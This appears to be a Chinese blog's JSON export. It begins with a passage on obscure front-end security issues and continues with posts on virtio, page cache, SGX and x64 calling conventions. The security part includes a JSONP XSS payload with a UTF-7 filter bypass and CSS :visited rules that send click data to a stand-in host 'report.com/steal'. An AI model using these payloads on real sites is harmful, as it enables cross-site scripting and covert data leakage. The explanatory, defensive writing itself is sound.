Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容 Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix） window.name，本质就是一个DOM 存储，并不存在本地。 老外Samy Kamkar用半天开发了一个JavaScript API：evercookie。 该API利用了上面的全部存储手段，将“永不丢失你的cookie”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。 四、函数覆写监听上报 覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：搞跨站的人总习惯用alert来确认是否已成功跨站，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。 123456789 function log(s) &#123; var img = new Image(); img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);&#125;var _alert = alert;window.alert = function(s) &#123; log(alert.caller); _alert(s);&#125; 如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学… 其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：浅谈javascript函数劫持。 五、内存Cookie与硬盘Cookie 内存Cookie - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁 硬盘Cookie - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期 我们很容易得出结论：内存Cookie更安全。因此，某些站点会把敏感信息放到内存Cookie里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。 因此，这里有两个关注点： 敏感信息还是不要放Cookie里，即使是内存Cookie； 服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。 六、CSS带来的点击量泄露 在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。 假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。 试想这是一个 导航栏组件，html代码是这样的： 123 &lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt; 你忽略掉的css写成这样： 123 #a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125; 我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的点击数据量就暴露给第三方了！ 当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了… HTML5提供伪类::selection，当指定对象区域被选择时，就会触发。其原理跟上面类似。 七、JSONP回调函数与UTF-7编码 基本原理 在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求： cgi-bin/get_jsonp?id=123&amp;call_back=some_function 返回数据格式为： some_function([{'id':123, data:'some_data'}]); 如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。 请求： cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt; 返回： &lt;script&gt;alert(1);&lt;/script&gt;([{'id':123, data:'some_data'}]); 所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？ IE解析UTF-7漏洞 比较简单的过滤方法，是过滤&lt;&gt;字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析（IE7后续版本已发布补丁修复）。 在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上&quot;+/v8&quot;头： cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4 这时候巧妙的躲开了&lt;&gt;过滤，而返回： +/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’}); 这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。 八、过滤与代码混淆 过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：jsfuck。 站名如其名，满满的恶意…它可以仅仅用6个字符：[]()!+去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句alert(1)编码成了3009个字符，并执行成功： 所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。 九、心理学与社会工程学 有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例： 诱导触发拖拽事件 比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？ 很简单，添加一张图片： 注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。 传说中的QQ空间“传染病毒” 步骤是这样的： A(始作俑者)发布了一条说说：这个网站很好玩，快来试试吧~ http://xxx.xxx A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！） 一传十十传百，越传越广… 但真实的情况跟CSRF没一点关系。玄妙在于：好友们打开链接后干了什么事情？ 这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？ 用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说… 有人会问，这不是CSRF吗？还真不是。做法却很简单： “有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是点击了iframe中的转发按钮。真是令人万万没想到。 本文链接： http://www.meng.uno/articles/23b9d6e9/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"冷门","slug":"冷门","permalink":"http://www.meng.uno/tags/冷门/"}]},{"title":"Virtio原理","slug":"virtio","date":"2016-05-10T03:41:13.000Z","updated":"2018-04-10T05:46:42.646Z","comments":true,"path":"articles/1ae8cec4/","link":"","permalink":"http://www.meng.uno/articles/1ae8cec4/","excerpt":"virtio简介 virtio是KVM虚拟环境下，针对I/O虚拟化的通用框架。virtio是一个半虚拟化驱动。首先说明一下全虚拟化和半虚拟化的区别。全虚拟化是指guest操作系统运行在物理机器上的hypervisor上，它不知道自己已被虚拟化，不需要任何更改就可以工作。半虚拟化指的是guest操作系统不仅知道它运行在hypervisor上，还包括让guest操作系统更高效与hyperviosr交互的代码(驱动程序)。 QEMU模拟I/O 如果使用QEMU模拟I/O，当guest中的设备驱动程序发起I/O操作请求时，KVM中的I/O操作捕获代码会将这次I/O请求拦截，在经过处理后将这次I/O请","text":"virtio简介 virtio是KVM虚拟环境下，针对I/O虚拟化的通用框架。virtio是一个半虚拟化驱动。首先说明一下全虚拟化和半虚拟化的区别。全虚拟化是指guest操作系统运行在物理机器上的hypervisor上，它不知道自己已被虚拟化，不需要任何更改就可以工作。半虚拟化指的是guest操作系统不仅知道它运行在hypervisor上，还包括让guest操作系统更高效与hyperviosr交互的代码(驱动程序)。 QEMU模拟I/O 如果使用QEMU模拟I/O，当guest中的设备驱动程序发起I/O操作请求时，KVM中的I/O操作捕获代码会将这次I/O请求拦截，在经过处理后将这次I/O请求的信息放在I/O共享页，然后通知QEMU程序。QEMU获得I/O操作的具体信息后，交由硬件模拟代码模拟出本次I/O操作，完成后，将结果放回I/O共享页，并通知KVM模块中的I/O操作捕获代码。最后，KVM模块中的捕获代码读取I/O共享页中的操作结果，把结果返回到客户机中。倘若guest通过DMA访问大块I/O时，QEMU不会把操作结果放在I/O共享页中，而是通过内存映射的方式将结果直接写到guest的内存中。 virtio模拟I/O 下图中，最上面一排(virtio_blk等)是前端驱动，它们是在客户机中存在的驱动程序模块，而后端处理程序是在QEMU中实现的。在前端和后端之间，定义了两层来支持guest和QEMU之间的通信。virtio层是虚拟队列借口，一个前端驱动程序可以使用多个队列。虚拟队列实际上是guest操作系统和hyperviosr的衔接点。而virtio-ring实现了环形缓冲区，它用来保存前端驱动和后端处理程序执行的信息，并且它可以一次性保存前端驱动的多次I/O请求，并且交由后端驱动去批量处理，最后实际调用host中设备驱动实现物理上的I/O操作，这样做就可以实现批量处理，而不是客户机中的每次I/O请求都需要处理一次，从而提高了guest和hypervisor信息交换的效率。 virtio_blk 在linux中，对于块设备的访问，通常是用一个I/O队列，来维护一系列的bio数据结构，通常一个请求可能包含多个bio结构。bio是上层内核vfs与下层驱动连接的纽带。 virtio_blk结构体中的gendisk结构多request_queue队列接收block层的bio请求，按照request_queue队列默认处理过程，bio请求会在io调度层转化为request，然后进入request_queue队列，最后调用virtblk_request将request转化为vbr结构，最后由QEMU接管处理。 QEMU处理过vdr之后，会将它加入到virtio_ring的request队列，并发一个中断给队列，队列的中断响应函数vring_interrupt调用队列的回调函数virtblk_done。 最后由request_queue注册的complete函数virtblk_request_done处理，通过blk_mq_end_io通告块设备层IO结束。 本文链接： http://www.meng.uno/articles/1ae8cec4/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://www.meng.uno/tags/虚拟化/"},{"name":"Virtio","slug":"Virtio","permalink":"http://www.meng.uno/tags/Virtio/"}]},{"title":"页缓存（Page Cache）","slug":"page-cache","date":"2016-04-16T04:22:47.000Z","updated":"2018-04-10T05:46:42.638Z","comments":true,"path":"articles/4314a663/","link":"","permalink":"http://www.meng.uno/articles/4314a663/","excerpt":"buffer cache/page cache linux中存在有两个缓存，buffer cache是针对设备的缓存，而page cache是针对文件的缓存。对于一个ext4文件系统来说，每个文件都有一棵radix树管理文件的缓存页，这些缓存页就是page cache；而对于每个块设备来说，都有一棵radix树来管理数据的缓存块，这些缓存块被称为buffer cache。在常见的linux系统中，page cache通常以4kb为单位，而buffer cache的大小由块设备来决定，通常是512B。总的来说，page cache是对文件数据的缓存，而buffer cache是对设备数据的缓存。","text":"buffer cache/page cache linux中存在有两个缓存，buffer cache是针对设备的缓存，而page cache是针对文件的缓存。对于一个ext4文件系统来说，每个文件都有一棵radix树管理文件的缓存页，这些缓存页就是page cache；而对于每个块设备来说，都有一棵radix树来管理数据的缓存块，这些缓存块被称为buffer cache。在常见的linux系统中，page cache通常以4kb为单位，而buffer cache的大小由块设备来决定，通常是512B。总的来说，page cache是对文件数据的缓存，而buffer cache是对设备数据的缓存。 在linux 2.4之前，这两个cache是有区别的，但这明显会产生一些浪费。因此在2.4之后的内核版本中，这两个cache就被统一化了：使用page cache。如果一个缓存数据既代表文件又代表块，那么buffer cache就直接指向page cache。 但是buffer cache依然是保留的。因为内核依然需要进行block的I/O。由于大部分block表示的是文件数据，因此它们都通过page cache的形式来缓存。但是剩下的小部分数据不是文件：它们是metadata活着原始的block I/O，这一部分依然由buffer cache来保存。 linux当中，所有的文件I/O操作，都是通过page cache来实现的。写操作是通过将page cache中对应的页标记为脏页来实现的；读操作是通过从page cache中返回数据来实现的。如果数据还不在cache中，就先把它读到cache里面。 如果只是研究一般文件的读写，那么就只需要在意page cache，不用去关心buffer cache。 关系 现在我们知道，在linux中，大部分文件都采用了page cache的形式来进行缓存。但是块设备的读写，却是以块的形式来进行的。前面有提到，page cache通常以4kb为单位，而buffer cache则通常是512B的。实际上，一个或多个buffer cache组成了一个page cache。 linux支持的文件系统，大多以块的形式组织文件。在文件以块的形式调入内存后，就以buffer cache的形式，对它们进行管理。buffer cache由两个部分组成，分别是缓冲区的首部buffer_head，和实际的缓冲区内容。buffer_head中，有一个指向数据的指针，和一个缓冲区长度的字段，这两个部分并不相邻。每当以块的形式，将数据读入内存时，它就要被存储在一个缓冲区当中，而buffer_head则起到一个描述符的作用。 在从块设备中读写文件页的时候，会根据不同情况，来构造bio。bio中，io_vec中，bv_page字段，会指向page。在2.6版本后，buffer_head只给上层提供有关其描述的块的当前状态，描述磁盘块到物理内存的映射关系，而bio则负责所有块I/O操作。 在linux中，mpage_readpage试图读取文件中一个page大小的数据。最理想的情况下，这个page大小的数据都在连续的物理磁盘上吗，函数只需要提交一个bio就可以获取所有的数据。这里使用get block函数，检查物理块是否连续。如果连续，则直接调用mpage_bio_submit函数请求整个page的数据，不连续则调用block_read_full_page逐个block读取，建立bh和bio之间的关系。mpage从来不回把不完整的页放进bio中，除非是文件的结尾。 页高速缓存到用户空间 所谓的页高速缓存到用户空间，实际上分为两种：一种是read到用户空间，也就是复制到用户空间中的堆中去；第二种是映射，mmap是在堆外的空间。 读取，要经过两次复制： 第一次是从磁盘中读取来填充页缓存中的页； 第二次是将是从内存中的页缓存，读取到进程堆空间的内存中。 映射，只有一次复制：从磁盘中复制到缓存中。mmap会创建一个虚拟内存区域vm_area_struct，进程的task_struct包含了进程页表项，让这些页表项指向页缓存所在的物理页page。 由于程序的代码段必然是通过mmap来实现的，因此它们在使用时，其实是保存在页缓存中的。 本文链接： http://www.meng.uno/articles/4314a663/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"I/O","slug":"I-O","permalink":"http://www.meng.uno/tags/I-O/"}]},{"title":"SGX","slug":"sgx","date":"2016-04-10T03:33:26.000Z","updated":"2018-04-10T05:46:42.640Z","comments":true,"path":"articles/4b3349ff/","link":"","permalink":"http://www.meng.uno/articles/4b3349ff/","excerpt":"1 SGX SGX:Software Guard Extensions 在运行时，程序可以分为几个部分： 1. Untrusted Run-Time System:在SGX enclave外部执行的部分，负责加载和管理一个enclave，并且Ecall enclave，接受enclave中的Ocall。 2. Trusted Run-Time System:在SGX enclave内部执行的部分，接受Ecall，进行Ocall，并对enclave自身进行管理。 3. Edge routines：指的是函数边的情况。 4. 第三方库：为SGX定制的库。 ECall：Enclav","text":"1 SGX SGX:Software Guard Extensions 在运行时，程序可以分为几个部分： Untrusted Run-Time System:在SGX enclave外部执行的部分，负责加载和管理一个enclave，并且Ecall enclave，接受enclave中的Ocall。 Trusted Run-Time System:在SGX enclave内部执行的部分，接受Ecall，进行Ocall，并对enclave自身进行管理。 Edge routines：指的是函数边的情况。 第三方库：为SGX定制的库。 ECall：Enclave call，调用enclave当中的函数。 OCall：Out call，从enclave内部到外部的调用。 在SGX中，enclave是用来减少信任基的，在运行时不可信域决定了可信域函数的调用顺序，也决定了起内部的上下文；并且ECall和OCall的返回值和参数也是不可信的。 文件格式：除了代码段、数据段之外，enclave文件还包含metadata,一个untrusted loader需要使用这个metadata来决定这个enclave如何被装载。 2 Enclave接口 将一个应用划分为trusted和untrusted两部分之后，需要定义二者之间的接口。不可信的应用通过ISV接口函数，对共享库进行调用(ECall)；而从Enclave对外部进行调用时(OCall)，在函数执行完后会返回可信的区域继续执行；中断也不会破坏这个过程。 Enclave需要暴露一部分接口给外部应用(ECalls)，同时又要声明哪些外部提供的服务(OCalls)是必须的。 Enclave的输入和输出都是不可信的代码可见的，因此enclave不能信任任何不可信域中的信息，检测ECall的输入参数和OCall的返回值。 Enclave中的参数等，都保存在可信的环境中，并且其读写不会对ISV代码和数据的完整性造成影响；而参数的长度、返回值等都由ISV来指定。对于引用的输入，enclave会进行更特殊的处理，确定指针所指的内存区域是否在enclave的线性范围之内。 对于操作系统的服务，Enclave是不能直接使用的，必须通过OCall作为接口，其return值作为输入传回给Encalve，这个值也是不可信的。 如果在OCall中使用了ECall，这就是一个nested ECall，使用者应该避免这种情况的发生，如果必须使用，则要对接口进行限制。 Enclave Definition Language EDL文件，用来描述enclave当中的trusted和untrusted部分。在Linux中，Edger8r Tool通过这个文件来创建enclave的C wrapper函数，也即ECALL和OCALL所使用的函数。 //EDL Template enclave { //包含文件和作为参数的数据结构 trusted { //任何enclave_t.h中包含的文件 //trusted function原型 }; untrusted { //任何enclave_u.t中包含的文件 //untrusted function原型 }; }; EDL文件不允许include有自定义类型的头文件。对于全局的包含文件，也不会包含在enclave当中。这类情况会使用不同的头文件，例如SGX会利用SDK所提供的stdio.h，而应用会使用由编译器提供的stdio.h。 EDL中的数据 EDL中可以使用基本的关键字，包括 char, short, long, int, float, double, void, int8_t, int16_t, int32_t, int64_t, size_t, wchar_t, uint8_t, uint16_t, uint32_t, uint64_t, unsigned, struct, enum, union 其它类型可以在头文件中包含。用户定义的数据类型可以在EDL中使用，但要遵守其编写的规范。正确的定义如下 enclave{ include &quot;user_types.h&quot; struct struct_foo_t { uint32_t struct_foo_0; uint64_t struct_foo_1; }; enum enum_foo_t { ENUM_FOO_0 = 0, ENUM_FOO_1 = 1 }; }; trusted { public void test_char(char val); public void test_int(int val); public void test_long(long long val); }; EDL中的指针 EDL中定义有一些和指针一起使用的值，这些值是用在ECALL和OCALL时使用的参数上的。指针需要用in,out,或者user_check进行明确的修饰。其中[in]和[out]说明的是方向： [in]表示参数从调用方传递到被调用放，对ECALL来说，in是从应用程序传递到enclave中，对OCALL来说则表示参数从应用程序传递到enclave中。 [out]表示参数是从被调用方返回到调用方。对ECALL来说，out表示参数从enclave传递到应用中，对OCALL来说则是从应用传递给enclave。 [in]和[out]组合使用表示参数是双向传递的。 方向属性能够用来提供保护，但会降低性能。如果使用user_check，则表示在不可信内存中的数据会在使用前进行验证。但[in]和[out]不支持包含有指针的结构体，这种情况必须使用user_check，并进行手动的验证。为了保证copy指针指向数据的安全性，它们还会和size，count，sizefun等一起使用。 其它数据类型 string和wstring表示参数是一个以NULL结束的字符串。 EDL支持用户定义的数据类型，但是不能定义在头文件中。任何使用typedef的基本类型，也都是用户定义的数据类型。有一些数据类型必须指定EDL属性，例如isptr，isary，readonly等，否则edger8r在编译时会报错。 propagate_error是OCALL的一个属性，如果使用这个属性，则enclave中的errno属性，会在OCALL返回之前被覆写为untrusted域中的errno中的值。在OCALL完成之后，无论OCALL是否成功，trusted域中的都会在OCALL完成之后更新。如果function失败了，那么errno就会检查是否出错，而如果函数成功了，那么OCALL就被允许修改errno的值。 ECALL访问/配置 默认的情况下，ECALL函数是不能直接被任何untrusted functions调用的。为了允许应用程序直接调用一个ECALL函数，则这个ECALL必须用public关键字来修饰。 Enclave配置文件是一个XML文件，它包含了用户定义的enclave参数，也是enclave项目的一部分。sgx_sign利用这个文件作为输入，来创建enclave的signature和metadata，它包括有这些项： &lt;EnclaveConfiguration&gt; &lt;ProdID&gt;100&lt;/ProdID&gt; &lt;ISVSVN&gt;1&lt;/ISVSVN&gt; &lt;StackMaxSize&gt;0x50000&lt;/StackMaxSize&gt; &lt;HeapMaxSize&gt;0x100000&lt;/HeapMaxSize&gt; &lt;TCSNum&gt;1&lt;/TCSNum&gt; &lt;TCSPolicy&gt;1&lt;/TCSPolicy&gt; &lt;DisableDebug&gt;0&lt;/DisableDebug&gt; &lt;MiscSelect&gt;0&lt;/MiscSelect&gt; &lt;MiscMask&gt;0xFFFFFFFF&lt;/MiscMask&gt; &lt;/EnclaveConfiguration&gt; Enclave加载 Enclave的源代码被编译为一个共享对象，为了使用一个enclave，enclave.so应该通过调用sgx_create_enclave()函数来加载到受保护的内存中。在第一次加载一个enclave时，加载器会获取launch token并且将它保存到token参数当中，用户能够将它保存在一个文件中，并且在之后加载时，从文件中获取token。而卸载enclave则是由用户调用sgx_destory_enclave(sgx_enclave_id_t)来实现的。 #define ENCLAVE_FILE _T(&quot;Enclave.signed.so&quot;) sgx_enclave_id_t eid; sgx_status_t ret = SGX_SUCCESS; sgx_launch_token_t token = {0}; int updated = 0; //创建 sgx_create_enclave(ENCLAVE_FILE, SGX_DEBUG_FLAG, &amp;token, &amp;updated, &amp;eid, NULL); //摧毁 sgx_destroy_enclave(eid); Untrusted/Trusted Library Functions untrusted函数只能在应用中，也就是enclave的外部调用。这些函数包括： Enclave的创建和摧毁 Quoting（用来确定处于SGX环境中） untrusted key交换 平台服务和启动控制 trusted库和enclave binary静态链接，它们只能在enclave内部使用。 Trusted Runtime System是SDK的一个关键组件，它提供enclave的入口逻辑，其他的helper函数，以及自定义的异常处理。 Trusted Service Library对数据进行保护，它包括有： － Wrapper函数 － sealing/unsealing － Trusted平台服务函数 SDK SGX的SDK目前提供了两种模式，hardware模式，也即在物理上拥有sgx的计算机上能够使用；而simulation则是模拟拥有sgx的计算机。在DEBUG模式中，开发者能够直接使用被签名过的enclave.signed.so，而不需要自己去进行签名。 3 Signature 在Enclave中，可信环境的建立有三个主要的部分，分别是 Measurement：当前环境下的，enclave的身份证明 Attestation：向其他部分证明自身可信 Sealing：能够在可信环境恢复时，恢复其相关的数据 Measurement Enclave包含一个由author提供的证书，也即Enclave Signature，它能够让SGX来检测enclave文件是否被篡改了，从而证明这个enclave是可信的。但硬件只在装载的时候进行检验，因此enclave signature还会对author进行验证，它包含这些部分： Enclave Measurement、Enclave Author的公钥、Security Verision Number、Product ID Attestation Attestation指的是第三方能够证实软件是在SGX平台上运行的。Intel SGX架构支持两种验证：本地验证和远程验证。 本地验证：一个enclave和另一个enclave协作，那么这两者之间就需要进行验证。enclave能够使用硬件来生成credential(report)，用来发给另一个enclave进行验证。 远程验证：一个拥有enclave的应用需要使用一个平台外的服务时，能够使用enclave来制造一个report，并且将它给平台服务，来产生一个credential(quote)，使用EPID技术来进行验证它来进行检测。 Sealing 在enclave被销毁时，需要识别出其中需要保护的data和state，以便在之后仍然能够在enclave中使用这些数据。这些数据只有被保存在enclave的外部。有两种情形： Seal到当前Enclave：在enclave创建时会有一个MRENCLAVE，只有拥有相同的MRENCLAVE才能unseal Seal到Enclave作者：在enclave创建时会有一个MRSIGNER，只有拥有相同MRSIGNER才能unseal 4 处理器特性 enclave writer需要依赖编译器和库，他无法知道生成的enclave是否使用了任何特殊的CPU拓展特性。不可信的loader可能会允许所有的特性，但是通过设置Enclave Signature Structure，是能够指定重载这部分的设置的。 在Enclave中，有一些指令是非法的，包括可能VMEXIT的，无法被软件处理的中断的，以及需要改变权限级别的，以及CPUID。 5 Power Management 现代操作系统提供的一种机制，允许应用被能耗事件通知。当平台进入S3和S4状态时，密钥会被擦除，所有的enclave会被销毁。Intel SGX并不直接提供Power down事件到enclave当中。应用可以为这些事件注册相应的回调函数，在其被调用时，将secret state保存到磁盘上。但OS不保证enclave有足够的时间去做这件事情，因此enclave最好通过power transition events对enclave state data进行周期性的保护。 6 线程相关 当多线程的程序运行时，thread Binding，TLS的使用都可能带来问题。对于enclave来说，开发者可以选择Non-Binding和Binding两种模式。Non-Binding模式会在不可信运行时，使用任意的TTC，并且使用一个root call进入enclave中，每次root call时，TLS都会被初始化；Binding模式下，不可信线程会和一个enclave中的可信线程绑定。 SGX虚拟化 KVM-SGX 虚拟机中的epc，使用sgx_vm_epc_buffer结构来管理的。其数据结构如下： struct sgx_vm_epc_buffer { struct list_head buf_list; struct list_head page_list; unsigned int nr_pages; unsigned long userspace_addr; __u32 handle; }; Kai Huang添加了sgx_vm.c。 __alloc_epc_buf:申请一个新的epc buffer，在这里对每一个页，都申请了一个iso_page。它调用sgx_alloc_vm_epc_page来完成具体的申请。这个函数定义在sgx_alloc_epc_page当中，实际上调用的就是sgx_alloc_epc_page。 __get_next_epc_buf_handle():每一个epc buffer都有一个handle，这个handle相当于一个标识，利用handle来找到对应的epc buffer，这个函数用来在申请一个epc_buf的时候，获取它的handle。 __free_epc_buf():释放epc buffer，这里同样也要完成对应的iso_pages的释放。 __sgx_map_vm_epc_buffer():按页实际完成按页的映射，它调用了vm_insert_pfn函数。它进而调用vm_insert_pfn_prot，这个函数位于mm/memory.c中，也即完成一个页的映射(pfn to pfn)。 在kvm_main.c中，hva_to_pfn函数被进行了修改，这是为了让pfn的映射，支持到EPC这一段内存，而epc并不是连续的，所以需要从页表中搜索到pfn。hva_to_pfn()，其参数address为host virtual address，通过一个guest页的hva，来找到对应的pfn。它调用了follow_pfn(使用user virtual address来查找一个页框)。 只有在hva_to_pfn_fast/hva_to_pfn_slow都无法找到pfn时，才会使用这种方法。因为EPC不是连续的内存段，所以会用这种方法特殊处理。 arch/x86/kvm/vmx.h/vmx.c中，做了VMX和SGX交互的修改。 首先对于一部分enclave中不允许使用的指令，例如CPUID，INVD，做了#GP处理。 vmx_exit_from_enclave():enclave中发生了VMEXIT的情况。这里使用了VM_EXIT_REASON的bit 27和GUEST_INTERRUPTIBILITY_INFO中的bit 4来表示VMEXIT的原因。 vmx_handle_exit是对exit的具体处理。利用VM_EXIT_REASON的bit 27，可以判断这个exit是在enclave当中发生的。这个函数确定exit的类型，再交由对应的handler进行处理。 QEMU-SGX 在target-i386/kvm.c当中，qemu首先为isgx定义了一个设备node:/dev/sgx，并且定义了VM中SGX的状态SGXState。在kvm.c中，定义了epc的alloc、free #define SGX_IOC_ALLOC_VM_EPC _IOWR(SGX_MAGIC, 0x03, struct sgx_alloc_vm_epc) #define SGX_IOC_FREE_VM_EPC _IOW(SGX_MAGIC, 0x04, struct sgx_free_vm_epc) 这两个宏定义，最后交给了struct中对应的handle来处理，也即ISGX驱动中对应的函数。而qemu内部的接口则是kvm_alloc_epc/kvm_free_vm_epc。kvm.c中，还定义了epc的初始化和销毁。epc的计算是在vcpus创建之前完成的，这里epc的大小被限制在256M之内，它被放置在below_4g_memory_size的位置，位于PCI的基址之下。在target-i386/cpu.c中，添加了对cpuid对应功能的支持。 在/hw/i386/acpi-build.c当中，添加了EPC的ACPI table项。 本文链接： http://www.meng.uno/articles/4b3349ff/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"SGX","slug":"SGX","permalink":"http://www.meng.uno/tags/SGX/"}]},{"title":"Linux系统参数传递","slug":"64bitslinux","date":"2016-04-10T03:16:31.000Z","updated":"2018-04-10T05:46:42.625Z","comments":true,"path":"articles/bc46dabc/","link":"","permalink":"http://www.meng.uno/articles/bc46dabc/","excerpt":"x64寄存器 x64体系提供了16个通用寄存器，以及16个通用寄存器，以及16个浮点寄存器XMM/YMM寄存器。这些寄存器分为两类： * 易失寄存器：由调用方假想的临时寄存器，并要在调用过程中销毁。 * 非易失寄存器：需要在整个函数调用过程中保留其值，一旦使用，必须由调用方保存。 也就是说，易失寄存器被定义为随时会改变，不用恢复它的初始值。但是如果要嵌入一些汇编语句，还是要对它们进行保护和恢复。而易失寄存器一旦使用，必须由调用方来对它们进行保存。也就是说在任何情况下使用它们，都必须进行保存。 寄存器 使用 是否在调用前保存 RAX 临时寄存器传递参数寄存器数量，第一返回值寄存器 否","text":"x64寄存器 x64体系提供了16个通用寄存器，以及16个通用寄存器，以及16个浮点寄存器XMM/YMM寄存器。这些寄存器分为两类： 易失寄存器：由调用方假想的临时寄存器，并要在调用过程中销毁。 非易失寄存器：需要在整个函数调用过程中保留其值，一旦使用，必须由调用方保存。 也就是说，易失寄存器被定义为随时会改变，不用恢复它的初始值。但是如果要嵌入一些汇编语句，还是要对它们进行保护和恢复。而易失寄存器一旦使用，必须由调用方来对它们进行保存。也就是说在任何情况下使用它们，都必须进行保存。 寄存器 使用 是否在调用前保存 RAX 临时寄存器传递参数寄存器数量，第一返回值寄存器 否 RBX 被调用者保存寄存器，选择性的基址指针 是 RCX 传递第四个参数 否 RDX 传递第三个参数，第二返回值寄存器 否 RSP 栈指针 是 RBP 被调用者保存寄存器，选择性的栈帧寄存器 是 RSI 传递第二个参数 否 RDI 传递第一个参数 否 R8 传递第五个参数 否 R9 传递第六个参数 否 R10 临时寄存器，用于传递函数的静态链指针 否 R11 临时寄存器 否 R12-R15 被调用者保护寄存器 是 xmm0-xmm1 传递和返回浮点参数 否 xmm2-xmm7 传递浮点参数 否 xmm8-xmm15 临时寄存器 否 mmx0-mmx7 临时寄存器 否 st0-st1 临时寄存器，用来保存long double返回值 否 st2-st7 临时寄存器 否 fs 系统预留(线程特殊寄存器) 否 mxcsr SSE2控制和状态子寄存器 部分 x87 SW x87状态字 否 x87 CW x87控制字 是 参数传递 可以看出，在Linux中，前6个参数都是利用寄存器来进行传递的。那么参数多于6个的情况下，是如何传递的呢？首先参数按照从左到右的顺序，依次使用寄存器，在寄存器被使用完后，参数从右到左依次入栈，使用堆栈进行参数的传递。此处有一个例子： typedef struct { int a, b; double d; } structparm; structparm s; int e, f, g, h, i, j, k; long double ld; double m, n; __m256 y; extern void func (int e, int f, structparm s, int g, int h, long double ld, double m, __m256 y, double n, int i, int j, int k); func (e, f, s, g, h, ld, m, y, n, i, j, k); 那么，在这个函数的调用中，寄存器的使用情况如下： 通用寄存器 浮点寄存器 栈帧偏移 %rdi:e %xmm0:s.d 0:ld %rsi:f %xmm1:m 16:j %rdx:s.a,s.b %xmm2:y 24:k %rcx:g %xmm3:n %r8:h %r9:i 此处存在两个疑问:第一、s.a,s.b为什么使用同一个寄存器；第二、ld为什么直接使用了栈帧传递？第一个是在结构体中，s.a，s.b是对齐可合并的，因此可以使用一个寄存器来传递这两个参数（此处存在疑问，是我自己的理解）；第二个是因为long double被归为X87类，这类参数是必须通过内存来传递的。 Red zone 在linux中，red 